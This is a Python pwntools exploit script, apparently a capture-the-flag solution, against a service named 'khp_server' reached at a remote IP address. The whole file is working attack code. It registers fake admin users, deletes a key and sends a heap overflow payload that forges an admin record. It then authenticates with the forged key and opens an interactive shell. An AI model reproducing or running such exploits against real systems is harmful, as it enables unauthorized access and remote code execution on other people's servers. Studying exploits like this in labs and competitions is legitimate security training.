#!/usr/bin/env python3
from pwn import *
from time import sleep

context.binary = binary = ELF('./khp_server',checksec=False)

def REKE(username, role, overflow):
	p.sendline(f'REKE {username}:{role} '.encode() + overflow)

def DEKE(key_id):
	p.sendline(f'DEKE {key_id}'.encode())

def SAVE_KEY(key_id):
	p.sendline(f'SAVE {key_id}'.encode())

def RLDB():
	p.sendline(b'RLDB')

def AUTHENTICATE(key_id):
	p.sendline(f'AUTH {key_id}'.encode())

def EXEC():
	p.sendline(b'EXEC')


#p = remote('localhost', 8080)
#p = remote('172.17.0.2',1337)
p = remote('83.136.249.46',31222)

sleep(1)
info('Registering first fake user..')
REKE('pwn','admin',b'pwned')
sleep(1)
info('Registering second fake user..')
REKE('pwn','admin',b'pwned')
sleep(1)
info('Registering third fake user..')
REKE('pwn','admin',b'pwned')
sleep(1)
RLDB()
sleep(1)
DEKE(3)
sleep(1)
info('Overflowing the heap...')
REKE('PWN','PWN', b'\x01'*0x70+b'pwn:admin pwned')
sleep(1)
AUTHENTICATE(1)
sleep(1)
info(f'Dropping into shell...')
EXEC()

p.recvrepeat(1)
print('*** SHELL ***')
p.interactive()
